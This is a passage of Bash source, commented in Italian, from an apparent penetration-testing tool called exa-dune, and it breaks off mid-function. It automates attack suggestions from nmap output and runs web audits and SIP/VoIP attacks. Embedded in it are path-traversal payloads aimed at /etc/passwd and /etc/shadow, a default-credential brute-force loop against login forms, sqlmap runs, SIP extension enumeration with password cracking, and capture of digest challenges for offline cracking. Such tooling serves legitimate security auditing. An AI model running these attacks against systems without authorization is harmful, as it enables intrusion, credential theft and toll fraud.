# ── Attack Suggester ─────────────────────────────────────────────────────────
# Legge nmap output e restituisce una lista ordinata di attacchi consigliati.
# Output: righe nel formato "PRIORITY|MODULE|ARGS|REASON"
_suggest_attacks() {
    local nmap_file="$1"   # path a nmap_fast.nmap o nmap_fast.gnmap
    local target="$2"
    [[ ! -f "$nmap_file" ]] && return

    local open_ports=""
    # Supporta sia .nmap che .gnmap
    if grep -qE "^[0-9]+/tcp" "$nmap_file" 2>/dev/null; then
        # formato .nmap
        open_ports=$(grep -E "^[0-9]+/tcp.*open" "$nmap_file" | grep -oP "^[0-9]+" | tr '\n' ' ')
    else
        # formato .gnmap
        open_ports=$(grep -oP "[0-9]+/open" "$nmap_file" | grep -oP "^[0-9]+" | tr '\n' ' ')
    fi

    local suggestions=()

    # Mappa porta → modulo + args + motivo
    # Formato: "PRIORITY|MODULE|ARGS|REASON"
    for p in $open_ports; do
        case "$p" in
            80)   suggestions+=("10|web|$target --port 80 --scheme http|HTTP aperto — audit web (nikto, gobuster, header, SQLi, LFI)") ;;
            443)  suggestions+=("10|web|$target --port 443 --scheme https|HTTPS aperto — audit web con SSL") ;;
            8080) suggestions+=("11|web|$target --port 8080 --scheme http|HTTP alternativo 8080 — spesso admin panel embedded") ;;
            8443) suggestions+=("11|web|$target --port 8443 --scheme https|HTTPS alternativo — admin panel o API") ;;
            8081|8082|8888|9090|9443)
                  suggestions+=("12|web|$target --port $p --scheme http|Porta web non standard — possibile admin/API esposto") ;;
            22)   suggestions+=("20|ssh|$target|SSH aperto — audit algoritmi + brute force credenziali") ;;
            23)   suggestions+=("15|telnet|$target --ports 23|Telnet aperto — brute force + banner grab (CRITICAL: cleartext)") ;;
            2323) suggestions+=("15|telnet|$target --ports 2323|Telnet alternativo — comune su router/IoT") ;;
            2002) suggestions+=("15|telnet|$target --ports 2002|Telnet VoIP — credenziali default") ;;
            21)   suggestions+=("18|ftp|$target|FTP aperto — accesso anonimo, traversal, brute force") ;;
            445|139)
                  suggestions+=("14|smb|$target|SMB aperto — EternalBlue, null session, enum share, brute force") ;;
            5060|5061)
                  suggestions+=("13|sip|$target|SIP/VoIP aperto — enum extension, password crack, toll fraud") ;;
            554|8554)
                  suggestions+=("16|rtsp|$target|RTSP aperto — stream IP camera, brute force credenziali") ;;
            1883|8883)
                  suggestions+=("19|mqtt|$target|MQTT aperto — broker IoT, accesso anonimo, wildcard subscribe") ;;
            502)  suggestions+=("17|modbus|$target|Modbus aperto — PLC/ICS esposto, lettura registri, write access") ;;
            3389) suggestions+=("21|rdp|$target|RDP aperto — BlueKeep, NLA check, brute force") ;;
            5900) suggestions+=("21|vnc|$target|VNC aperto — weak auth, brute force password") ;;
            389|636)
                  suggestions+=("22|ldap|$target|LDAP aperto — anonymous bind, enum utenti/gruppi/policy") ;;
            6379) suggestions+=("16|redis|$target|Redis aperto — accesso no-auth, config dump, RCE via CONFIG SET") ;;
            53)   suggestions+=("25|dns|$target|DNS aperto — zone transfer, subdomain brute force, cache snooping") ;;
            1900|5000)
                  suggestions+=("24|upnp|$target|UPnP aperto — device description, port mapping senza auth") ;;
            69)   suggestions+=("23|tftp|$target|TFTP aperto — download configurazione, firmware") ;;
            623)  suggestions+=("23|ipmi|$target|IPMI/BMC aperto — auth bypass, credenziali default") ;;
            161|162)
                  suggestions+=("13|snmp|$target|SNMP aperto — community brute force, OID walk, WRITE test") ;;
            44818|102)
                  suggestions+=("17|modbus|$target|Porta ICS/SCADA — audit Modbus/industrial protocol") ;;
            8000) suggestions+=("16|onvif|$target --port 8000|ONVIF/gSOAP esposto — brute force WS-Security, GetDeviceInfo") ;;
            1935) suggestions+=("19|rtmp|$target --port 1935|RTMP esposto — probe stream DVR/NVR/telecamere") ;;
            44818) suggestions+=("16|enip|$target|EtherNet/IP (44818) — PLC/ICS Allen-Bradley, Rockwell") ;;
            5683) suggestions+=("23|coap|$target|CoAP esposto — dispositivo IoT, risorse pubbliche") ;;
            3702) suggestions+=("24|wsd|$target|WS-Discovery (3702) — device fingerprint telecamere/stampanti") ;;
            47808) suggestions+=("17|bacnet|$target|BACnet/IP (47808) — building automation, lettura oggetti") ;;
            5353) suggestions+=("24|mdns|$target|mDNS/Bonjour (5353) — servizi Zeroconf sulla rete locale") ;;
        esac
    done

    # Dedup (stessa priorità+modulo)
    local seen=()
    local -A seen_map
    for s in "${suggestions[@]}"; do
        local key; key=$(echo "$s" | cut -d'|' -f1,2)
        if [[ -z "${seen_map[$key]:-}" ]]; then
            seen_map[$key]=1
            seen+=("$s")
        fi
    done

    # Ordina per priorità (campo 1) e stampa
    printf '%s\n' "${seen[@]}" | sort -t'|' -k1,1n
}

# Stampa i suggerimenti in modo formattato a schermo
_print_suggestions() {
    local nmap_file="$1" target="$2"
    echo ""
    echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${CYAN}║           ATTACCHI CONSIGLIATI — AUTO-SUGGEST            ║${NC}"
    echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    local n=0
    while IFS='|' read -r prio module args reason; do
        ((n++)) || true
        local color="$GREEN"
        [[ $prio -le 15 ]] && color="$RED"
        [[ $prio -le 18 && $prio -gt 15 ]] && color="$YELLOW"
        printf "  ${color}[%2d]${NC} %-10s %s\n" "$n" "$module" "$reason"
        echo -e "       ${CYAN}→${NC} exa-dune $module $args"
        echo ""
    done < <(_suggest_attacks "$nmap_file" "$target")
    [[ $n -eq 0 ]] && warn "Nessuna porta mappabile trovata — esegui prima: exa-dune scan $target" || true
}

# ============================================================
#  SUBCOMMAND: scan
# ============================================================
usage_scan() {
    echo "Uso: exa-dune scan <TARGET> [OPTIONS]"
    echo ""
    echo "  Port scan + fingerprinting + recon"
    echo "  Wraps: nmap (fast/full/UDP), arp-scan, searchsploit"
    echo ""
    echo "Opzioni:"
    echo "  --stealth          nmap -T2, rate ridotto"
    echo "  --udp-top N        UDP top N porte (default: 20)"
    echo "  --no-full          Salta nmap -p- (full port scan)"
    echo "  --vuln             Esegui nmap --script vuln sui port aperti"
    echo "  --timeout N        Timeout in minuti per ogni tool (default: nessuno)"
    echo "  --output DIR       Directory di output"
    echo "  --dry-run          Mostra comandi senza eseguire"
}

cmd_scan() {
    local target="" udp_top=20 do_full=1 do_vuln=0
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --stealth)   STEALTH=1;        shift ;;
            --udp-top)   udp_top="$2";     shift 2 ;;
            --no-full)   do_full=0;        shift ;;
            --vuln)      do_vuln=1;        shift ;;
            --timeout)   TIMEOUT="$2"; validate_timeout "$2"; shift 2 ;;
            --output)    OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_scan; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_scan; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_scan; exit 1; }
    validate_target "$target"
    check_root
    apply_stealth
    setup_outdir "$target" "scan"
    log "Target: $target | Output: $OUTDIR"

    section "ARP Scan"
    if require_tool arp-scan; then
        local iface; iface=$(ip route get "$target" 2>/dev/null | awk '/dev/{print $5; exit}' || echo eth0)
        run_cmd "arp_scan" \
            "arp-scan -I ${iface} ${target}/32 2>/dev/null | tee "$OUTDIR"/arp.txt; echo '[DONE] arp-scan'"
    fi

    section "Nmap Fast (top 1000 + scripts)"
    run_cmd "nmap_fast" \
        "nmap -sV -sC -O --min-rate $NMAP_RATE_FAST $NMAP_TIMING \
         -oA "$OUTDIR"/nmap_fast $target 2>&1 | tee "$OUTDIR"/nmap_fast.log"

    if [[ $do_full -eq 1 ]]; then
        section "Nmap Full (-p-)"
        run_cmd "nmap_full" \
            "nmap -sV -p- --min-rate $NMAP_RATE_FULL $NMAP_TIMING \
             -oA "$OUTDIR"/nmap_full $target 2>&1 | tee "$OUTDIR"/nmap_full.log"
    fi

    section "Nmap UDP top $udp_top"
    run_cmd "nmap_udp" \
        "nmap -sU --top-ports $udp_top $NMAP_TIMING \
         -oA "$OUTDIR"/nmap_udp $target 2>&1 | tee "$OUTDIR"/nmap_udp.log"

    section "Searchsploit (da nmap XML)"
    if require_tool searchsploit && [[ $DRY_RUN -eq 0 ]]; then
        local tries=0
        while [[ ! -f "$OUTDIR/nmap_fast.xml" && $tries -lt 60 ]]; do
            sleep 5; ((tries++))
        done
        [[ -f "$OUTDIR/nmap_fast.xml" ]] && \
            searchsploit --nmap "$OUTDIR/nmap_fast.xml" 2>/dev/null | tee "$OUTDIR/searchsploit.txt"
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} searchsploit --nmap $OUTDIR/nmap_fast.xml"
    fi

    if [[ $do_vuln -eq 1 ]]; then
        section "Nmap Vuln Scripts"
        run_cmd "nmap_vuln" \
            "nmap -sV --script vuln $NMAP_TIMING \
             -oN \"$OUTDIR\"/nmap_vuln.txt $target 2>&1 | tee \"$OUTDIR\"/nmap_vuln.log"
        # Auto-searchsploit per ogni banner trovato
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nmap_fast.xml" ]]; then
            log "Searchsploit per banner individuali..."
            grep -oP 'product="[^"]+"' "$OUTDIR/nmap_fast.xml" 2>/dev/null | \
                sed 's/product="//;s/"//' | sort -u | while IFS= read -r prod; do
                [[ -z "$prod" ]] && continue
                echo "--- $prod ---" >> "$OUTDIR/searchsploit_banners.txt"
                searchsploit "$prod" 2>/dev/null | head -10 >> "$OUTDIR/searchsploit_banners.txt" || true
            done
        fi
    fi

    ok "Scan completato → $OUTDIR"
    echo "  Risultati: $OUTDIR/"

    # Auto-suggest attacchi basati sulle porte trovate
    if [[ $DRY_RUN -eq 0 ]]; then
        local nmap_out
        nmap_out=$(find "$OUTDIR" -name "nmap_fast.nmap" -o -name "nmap_fast.gnmap" 2>/dev/null | head -1)
        if [[ -n "$nmap_out" ]]; then
            _print_suggestions "$nmap_out" "$target"
            echo -e "  ${BOLD}Suggerimento:${NC} exa-dune pipeline $target --from-scan $OUTDIR_BASE"
            echo -e "  (pipeline esegue automaticamente gli attacchi e genera report PDF)"
        fi
    fi
}

# ============================================================
#  SUBCOMMAND: web
# ============================================================
usage_web() {
    echo "Uso: exa-dune web <TARGET> [OPTIONS]"
    echo ""
    echo "  Web application audit"
    echo "  Wraps: curl (headers/SSL), nikto, gobuster, nmap http NSE"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta (default: 443)"
    echo "  --scheme SCHEME    http o https (default: https)"
    echo "  --wordlist FILE    Wordlist per gobuster"
    echo "  --threads N        Thread gobuster (default: 20)"
    echo "  --fuzz             Fuzzing parametri GET (ffuf/wfuzz)"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_web() {
    local target="" port=443 scheme="https" threads=20 do_fuzz=0
    local wordlist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      port="$2";        shift 2 ;;
            --scheme)    scheme="$2";      shift 2 ;;
            --wordlist)  wordlist="$2";    shift 2 ;;
            --threads)   threads="$2";     shift 2 ;;
            --fuzz)      do_fuzz=1;        shift ;;
            --output)    OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_web; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_web; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_web; exit 1; }
    validate_target "$target"
    validate_port "$port"
    [[ "$scheme" != "http" && "$scheme" != "https" ]] && { err "Scheme non valido: $scheme (http|https)"; exit 1; }
    setup_outdir "$target" "web_${port}"
    log "Target: ${scheme}://${target}:${port} | Output: $OUTDIR"

    local insecure=""; [[ "$scheme" == "https" ]] && insecure="-k"
    local base_url="${scheme}://${target}:${port}"
    local wl; wl="${wordlist:-$(_wl_web)}"

    section "HTTP Headers + Redirect"
    run_cmd "headers" \
        "curl -sv $insecure -L --max-time 10 -o /dev/null '${base_url}/' 2>&1 \
         | tee "$OUTDIR"/headers.txt"
    run_cmd "sec_headers" \
        "curl -sI $insecure --max-time 10 '${base_url}/' 2>&1 \
         | grep -iE 'strict-transport|x-frame|x-xss|x-content-type|content-security|permissions-policy|referrer' \
         | tee "$OUTDIR"/security_headers.txt"

    if [[ "$scheme" == "https" ]]; then
        section "SSL/TLS Analysis"
        run_cmd "ssl_nmap" \
            "nmap -p $port \
             --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
             -oN "$OUTDIR"/ssl_nmap.txt $target 2>&1"
        run_cmd "ssl_cert" \
            "echo | openssl s_client -connect '${target}:${port}' 2>/dev/null \
             | openssl x509 -text -noout 2>/dev/null | tee "$OUTDIR"/cert.txt"
    fi

    section "Web Vulnerability Scanner"
    if tool_ok nuclei; then
        # nuclei: veloce, template-based, modern (preferito a nikto)
        local nuclei_target="${scheme}://${target}:${port}"
        # -duc: no update check  -nh: no banner  -no-verify: ignora SSL self-signed
        local nuclei_opts="-u $nuclei_target -severity low,medium,high,critical -duc -nh -no-verify -o $OUTDIR/nuclei.txt"
        run_cmd "nuclei" "nuclei $nuclei_opts 2>&1"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/nuclei.txt" && -s "$OUTDIR/nuclei.txt" ]]; then
            grep -iE "\[critical\]|\[high\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                while IFS= read -r line; do found HIGH "Nuclei — $line"; done || true
            grep -iE "\[medium\]|\[low\]" "$OUTDIR/nuclei.txt" 2>/dev/null | \
                while IFS= read -r line; do found MEDIUM "Nuclei — $line"; done || true
            local nc; nc=$(wc -l < "$OUTDIR/nuclei.txt" 2>/dev/null || echo 0)
            log "  Nuclei: $nc finding(s) → $OUTDIR/nuclei.txt"
        fi
    elif require_tool nikto; then
        local nikto_opts="-h $target -p $port"
        [[ "$scheme" == "https" ]] && nikto_opts="$nikto_opts -ssl"
        run_cmd "nikto" "nikto $nikto_opts -output $OUTDIR/nikto.txt 2>&1"
    fi

    section "Gobuster Directory Enum"
    if require_tool gobuster && [[ -n "$wl" ]]; then
        local gb_opts="dir -u $base_url -w $wl -t $threads -q"
        [[ "$scheme" == "https" ]] && gb_opts="$gb_opts -k"
        run_cmd "gobuster" "gobuster $gb_opts 2>&1 | tee "$OUTDIR"/gobuster.txt"
    elif [[ -z "$wl" ]]; then
        warn "Wordlist web non trovata — gobuster saltato"
    fi

    section "Nmap HTTP NSE Scripts"
    run_cmd "nmap_http" \
        "nmap -p $port \
         --script http-methods,http-auth-finder,http-stored-xss,http-dombased-xss,http-csrf,http-robots.txt \
         -oN "$OUTDIR"/nmap_http.txt $target 2>&1"

    section "JS File Analysis (endpoint extraction)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local js_files
        js_files=$(curl -sk $insecure --max-time 10 "${base_url}/" 2>/dev/null \
                   | grep -oP 'src="[^"]+\.js[^"]*"' | sed 's/src="//;s/"//' || true)
        local js_count=0
        for jsfile in $js_files; do
            local js_url="${base_url}/${jsfile#/}"
            local jsname; jsname=$(basename "$jsfile" | tr '/?&' '_')
            curl -sk $insecure --max-time 10 "$js_url" -o "$OUTDIR/js_${jsname}" 2>/dev/null && {
                grep -oP '(?:api|page|action|endpoint)["\s:=]+["'"'"'][^"'"'"'<>\s]{3,80}["'"'"']' \
                    "$OUTDIR/js_${jsname}" 2>/dev/null \
                    | sort -u >> "$OUTDIR/js_endpoints.txt" || true
                ((js_count++))
            }
        done
        [[ $js_count -gt 0 ]] && log "Analizzati $js_count file JS"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} JS analysis su ${base_url}/"
    fi

    section "HTTP Methods Pericolosi"
    if [[ $DRY_RUN -eq 0 ]]; then
        for method in PUT DELETE TRACE CONNECT OPTIONS; do
            local code
            code=$(curl -sk $insecure -X "$method" --max-time 5 \
                   -o /dev/null -w "%{http_code}" "${base_url}/" 2>/dev/null)
            echo "  $method → HTTP $code" | tee -a "$OUTDIR/http_methods.txt"
            [[ "$method" == "PUT" && "$code" != "405" && "$code" != "501" ]] && \
                found MEDIUM "HTTP $method abilitato su $base_url → $code"
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Test metodi HTTP: PUT DELETE TRACE CONNECT OPTIONS"
    fi

    if [[ $do_fuzz -eq 1 ]]; then
        section "Parameter Fuzzing (ffuf/wfuzz)"
        local fuzz_wl; fuzz_wl=$(_wl_lfi)
        if tool_ok ffuf && [[ -f "$fuzz_wl" ]]; then
            run_cmd "ffuf_lfi" \
                "ffuf -u '${base_url}/FUZZ' -w $fuzz_wl -mc 200,301,302,403 \
                 $([[ "$scheme" == "https" ]] && echo '-k') \
                 -t $threads -o \"$OUTDIR\"/ffuf_lfi.json -of json 2>&1 | tail -5"
            run_cmd "ffuf_params" \
                "ffuf -u '${base_url}/?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
                 -mc 200,301,302 $([[ "$scheme" == "https" ]] && echo '-k') \
                 -t $threads -o \"$OUTDIR\"/ffuf_params.json -of json 2>&1 | tail -5"
        elif tool_ok wfuzz && [[ -f "$fuzz_wl" ]]; then
            run_cmd "wfuzz_lfi" \
                "wfuzz -c -w $fuzz_wl --hc 404,400 \
                 $([[ "$scheme" == "https" ]] && echo '--ssl') \
                 '$base_url/FUZZ' 2>&1 | tee \"$OUTDIR\"/wfuzz_lfi.txt | tail -10"
        else
            warn "ffuf e wfuzz non trovati — fuzzing saltato"
        fi
    fi

    section "LFI / Path Traversal (percorsi sensibili embedded)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local lfi_payloads=(
            "../../etc/passwd" "../../../etc/passwd" "../../../../etc/passwd"
            "../../etc/shadow" "../../etc/passwd%00"
            "..%2F..%2Fetc%2Fpasswd" "%2e%2e%2fetc%2fpasswd"
            "../../proc/version" "../../proc/net/route"
            "../../tmp/passwd" "../../var/etc/passwd"
        )
        for param in "file" "path" "page" "lang" "template" "include" "url" "load" "document"; do
            for payload in "${lfi_payloads[@]}"; do
                local code body
                body=$(curl -sk $insecure --max-time 5 \
                    "${base_url}/?${param}=${payload}" 2>/dev/null | head -3 || true)
                if echo "$body" | grep -qE "root:|bin:|daemon:|nobody:"; then
                    found CRITICAL "WEB LFI — ${base_url}/?${param}=${payload} → /etc/passwd esposto"
                    echo "${param}=${payload}" >> "$OUTDIR/lfi_found.txt"
                    break
                fi
            done
        done
        # Path traversal su percorsi CGI comuni
        for cgi_path in "/cgi-bin/readfile.cgi" "/cgi-bin/download.cgi" \
                        "/download" "/getfile" "/readfile"; do
            for payload in "../../etc/passwd" "../etc/passwd"; do
                body=$(curl -sk $insecure --max-time 5 \
                    "${base_url}${cgi_path}?file=${payload}" 2>/dev/null | head -3 || true)
                if echo "$body" | grep -qE "root:|bin:|daemon:"; then
                    found CRITICAL "WEB LFI — ${base_url}${cgi_path}?file=${payload} → /etc/passwd esposto"
                fi
            done
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} LFI/path traversal probe su ${base_url}"
    fi

    section "CORS Misconfiguration + Clickjacking"
    if [[ $DRY_RUN -eq 0 ]]; then
        # CORS: invia Origin arbitrario, verifica Access-Control-Allow-Origin
        local cors_resp
        cors_resp=$(curl -sk $insecure --max-time 8 \
            -H "Origin: https://evil.exa-dune-test.local" \
            -I "${base_url}/" 2>/dev/null || true)
        local acao; acao=$(echo "$cors_resp" | grep -i "access-control-allow-origin:" | head -1 || true)
        if echo "$acao" | grep -qiE "evil\.exa-dune-test|^\*"; then
            [[ "$acao" == *"*"* ]] && found HIGH "WEB CORS — Access-Control-Allow-Origin: * (wildcard)"
            echo "$acao" | grep -qi "evil" && \
                found CRITICAL "WEB CORS — Origin arbitrario riflesso: ${acao}"
        fi
        # Clickjacking: assenza di X-Frame-Options o CSP frame-ancestors
        local xfo; xfo=$(echo "$cors_resp" | grep -i "x-frame-options:" | head -1 || true)
        local csp; csp=$(echo "$cors_resp" | grep -i "content-security-policy:" | grep -i "frame-ancestors" | head -1 || true)
        if [[ -z "$xfo" && -z "$csp" ]]; then
            found MEDIUM "WEB — Clickjacking: X-Frame-Options assente e nessun CSP frame-ancestors"
        fi
        echo "CORS: ${acao:-non presente}" >> "$OUTDIR/web_security.txt"
        echo "X-Frame-Options: ${xfo:-ASSENTE}" >> "$OUTDIR/web_security.txt"
    else
        echo -e "${CYAN}[DRY-RUN]${NC} CORS + clickjacking test su ${base_url}"
    fi

    section "SQL Injection (sqlmap — livello base)"
    if tool_ok sqlmap && [[ $DRY_RUN -eq 0 ]]; then
        # Crawl breve + test parametri GET (non distruttivo: --level 1 --risk 1)
        run_cmd "sqlmap" \
            "sqlmap -u '${base_url}/' --crawl=2 --forms \
             --level 1 --risk 1 --batch --smart \
             $([[ "$scheme" == "https" ]] && echo '--ignore-proxy') \
             --output-dir \"$OUTDIR\"/sqlmap 2>&1 | tail -20"
        if [[ -d "$OUTDIR/sqlmap" ]]; then
            if grep -r "sqlmap identified" "$OUTDIR/sqlmap/" 2>/dev/null | grep -q "injectable"; then
                found CRITICAL "WEB SQLi — parametro iniettabile trovato (vedi $OUTDIR/sqlmap/)"
            fi
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} sqlmap -u '${base_url}/' --crawl=2 --forms --level 1 --risk 1 --batch"
    else
        warn "sqlmap non trovato — SQL injection saltato"
    fi

    section "Form Auth Bypass (credenziali default embedded)"
    if [[ $DRY_RUN -eq 0 ]]; then
        # Cerca form di login nella pagina principale
        local login_action
        login_action=$(curl -sk $insecure --max-time 8 "${base_url}/" 2>/dev/null \
            | grep -ioP '(?<=action=")[^"]+' | grep -iE "login|auth|session|signin" | head -1 || true)
        [[ -z "$login_action" ]] && login_action="/"
        local login_url="${base_url}${login_action}"
        # Credenziali comuni per device embedded
        local default_creds=(
            "admin:admin" "admin:password" "admin:1234" "admin:12345"
            "admin:Admin1234" "admin:" "root:root" "root:admin"
            "root:password" "user:user" "user:password"
            "supervisor:supervisor" "operator:operator"
            "service:service" "support:support"
            "guest:guest" "test:test"
        )
        local field_patterns=(
            "username=UUUU&password=PPPP"
            "user=UUUU&pass=PPPP"
            "login=UUUU&password=PPPP"
            "name=UUUU&password=PPPP"
        )
        for cred in "${default_creds[@]}"; do
            local u="${cred%%:*}" p="${cred##*:}"
            for fpat in "${field_patterns[@]}"; do
                local post_data="${fpat/UUUU/$u}"; post_data="${post_data/PPPP/$p}"
                local code
                code=$(curl -sk $insecure --max-time 6 -X POST \
                    -d "$post_data" -o /dev/null -w "%{http_code}" \
                    -L "${login_url}" 2>/dev/null || true)
                # 200/302 dopo POST con redirect diverso da login → probabile successo
                if [[ "$code" == "302" ]] || [[ "$code" == "200" ]]; then
                    local body_check
                    body_check=$(curl -sk $insecure --max-time 6 -X POST \
                        -d "$post_data" -L "${login_url}" 2>/dev/null | head -5 || true)
                    if echo "$body_check" | grep -qiE "logout|dashboard|welcome|admin|panel|home" && \
                       ! echo "$body_check" | grep -qiE "error|invalid|wrong|failed|incorrect"; then
                        found CRITICAL "WEB AUTH — credenziali default valide: ${u}:${p} (${login_url})"
                        echo "${u}:${p}" >> "$OUTDIR/web_default_creds.txt"
                        break 2
                    fi
                fi
            done
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Form auth bypass + default creds test su ${base_url}"
    fi

    ok "Web audit completato → $OUTDIR"
}

# ============================================================
#  SUBCOMMAND: sip
# ============================================================
usage_sip() {
    echo "Uso: exa-dune sip <TARGET> [OPTIONS]"
    echo ""
    echo "  SIP/VoIP enumeration e audit"
    echo "  Wraps: nmap sip NSE, svmap, svwar, svcrack"
    echo ""
    echo "Opzioni:"
    echo "  --port PORT        Porta SIP (default: 5060)"
    echo "  --range RANGE      Range extension svwar (default: 100-299)"
    echo "  --wordlist FILE    Wordlist per svcrack"
    echo "  --output DIR"
    echo "  --dry-run"
}

cmd_sip() {
    local target="" port=5060 ext_range="100-299" wordlist=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --port)      port="$2";        shift 2 ;;
            --range)     ext_range="$2";   shift 2 ;;
            --wordlist)  wordlist="$2";    shift 2 ;;
            --output)    OUTDIR_BASE="$2"; shift 2 ;;
            --dry-run)   DRY_RUN=1;        shift ;;
            --help|-h)   usage_sip; exit 0 ;;
            -*)          err "Opzione sconosciuta: $1"; usage_sip; exit 1 ;;
            *)           target="$1"; shift ;;
        esac
    done
    [[ -z "$target" ]] && { err "TARGET mancante"; usage_sip; exit 1; }
    validate_target "$target"
    validate_port "$port"
    setup_outdir "$target" "sip"
    log "Target: $target:$port | Output: $OUTDIR"

    section "Nmap SIP Scan (TCP+UDP 5060/5061)"
    run_cmd "nmap_sip" \
        "nmap -p $port,5061 -sU -sS \
         --script sip-enum-users,sip-methods \
         -oN "$OUTDIR"/nmap_sip.txt $target 2>&1"

    section "SIP Fingerprinting (svmap)"
    local svmap_cmd=""
    if tool_ok svmap; then
        svmap_cmd="svmap $target 2>&1 | tee "$OUTDIR"/svmap.txt"
    elif python3 -c "import sipvicious" 2>/dev/null; then
        svmap_cmd="python3 -m sipvicious.svmap $target 2>&1 | tee "$OUTDIR"/svmap.txt"
    fi
    if [[ -n "$svmap_cmd" ]]; then
        run_cmd "svmap" "$svmap_cmd"
    else
        warn "svmap non trovato — uso probe OPTIONS manuale"
        if [[ $DRY_RUN -eq 0 ]]; then
            local attacker_ip; attacker_ip=$(hostname -I | awk '{print $1}')
            local probe
            probe=$(printf 'OPTIONS sip:ping@%s SIP/2.0\r\nVia: SIP/2.0/UDP %s:5060;branch=z9hG4bKpk1\r\nFrom: <sip:test@%s>;tag=1\r\nTo: <sip:ping@%s>\r\nCall-ID: 1@%s\r\nCSeq: 1 OPTIONS\r\nMax-Forwards: 70\r\nContent-Length: 0\r\n\r\n' \
                "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip")
            echo "$probe" | nc -u -w 3 "$target" "$port" 2>&1 | head -5 | tee "$OUTDIR/sip_options_probe.txt"
        else
            echo -e "${CYAN}[DRY-RUN]${NC} SIP OPTIONS probe → $target:$port"
        fi
    fi

    section "Extension Enumeration svwar ($ext_range)"
    local svwar_cmd=""
    if tool_ok svwar; then
        svwar_cmd="svwar -e${ext_range} $target 2>&1 | tee "$OUTDIR"/svwar.txt"
    elif python3 -c "import sipvicious" 2>/dev/null; then
        svwar_cmd="python3 -m sipvicious.svwar -e${ext_range} $target 2>&1 | tee "$OUTDIR"/svwar.txt"
    fi
    if [[ -n "$svwar_cmd" ]]; then
        run_cmd "svwar" "$svwar_cmd"
        if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/svwar.txt" ]]; then
            grep -iE "found|exist|200 OK" "$OUTDIR/svwar.txt" 2>/dev/null \
                | tee "$OUTDIR/sip_extensions.txt" || true
        fi
    else
        warn "svwar non trovato — extension enum saltato"
    fi

    section "SIP Password Crack (svcrack)"
    local wl="${wordlist:-$(_wl_pass)}"
    if [[ $DRY_RUN -eq 0 && -f "$OUTDIR/sip_extensions.txt" ]]; then
        local found_exts
        found_exts=$(grep -oP '\d{3,6}' "$OUTDIR/sip_extensions.txt" 2>/dev/null | head -10 || true)
        local svcrack_bin=""
        tool_ok svcrack && svcrack_bin="svcrack"
        python3 -c "import sipvicious" 2>/dev/null && svcrack_bin="python3 -m sipvicious.svcrack"
        if [[ -n "$svcrack_bin" && -n "$found_exts" ]]; then
            for ext in $found_exts; do
                log "  Crack extension: $ext"
                run_cmd "svcrack_$ext" \
                    "$svcrack_bin -u $ext -d $wl $target 2>&1 | tee "$OUTDIR"/svcrack_${ext}.txt"
            done
        elif [[ -n "$svcrack_bin" ]]; then
            warn "Nessuna extension trovata — test su utente 'admin' con wordlist"
            run_cmd "svcrack_admin" \
                "$svcrack_bin -u admin -d $wl $target 2>&1 | tee "$OUTDIR"/svcrack_admin.txt"
        fi
    elif [[ $DRY_RUN -eq 1 ]]; then
        echo -e "${CYAN}[DRY-RUN]${NC} svcrack -u <ext> -d $wl $target"
    fi

    section "SIP Method Probes (INVITE, REGISTER, OPTIONS, INFO, SUBSCRIBE)"
    if [[ $DRY_RUN -eq 0 ]]; then
        local attacker_ip; attacker_ip=$(hostname -I | awk '{print $1}')
        for method in INVITE REGISTER OPTIONS INFO SUBSCRIBE NOTIFY; do
            local probe; probe=$(printf '%s sip:%s SIP/2.0\r\nVia: SIP/2.0/UDP %s:5060;branch=z9hG4bKpk\r\nFrom: <sip:kit@%s>;tag=1\r\nTo: <sip:%s>\r\nCall-ID: probe@%s\r\nCSeq: 1 %s\r\nMax-Forwards: 10\r\nContent-Length: 0\r\n\r\n' \
                "$method" "$target" "$attacker_ip" "$attacker_ip" "$target" "$attacker_ip" "$method")
            local resp; resp=$(echo "$probe" | nc -u -w 2 "$target" "$port" 2>&1 | head -1 || true)
            echo "  $method → $resp" | tee -a "$OUTDIR/sip_methods.txt"
            # SIP digest challenge capture
            if echo "$resp" | grep -q "^SIP/2.0 401\|^SIP/2.0 407"; then
                found INFO "SIP:$port — $method richiede autenticazione digest (${resp})"
                # Cattura il challenge completo per offline crack
                printf '%b' "$probe" | nc -u -w 3 "$target" "$port" 2>/dev/null \
                    >> "$OUTDIR/sip_digest_challenges.txt" || true
            fi
        done
    else
        echo -e "${CYAN}[DRY-RUN]${NC} Probe SIP: INVITE REGISTER OPTIONS INFO SUBSCRIBE → $target:$port"
    fi

    section "SIP over TCP test"
    if [[ $DRY_RUN -eq 0 ]]; then
        check_port "$target" "$port" && {
            local attacker_ip; attacker_ip=$(hostname -I | awk '{print $1}')
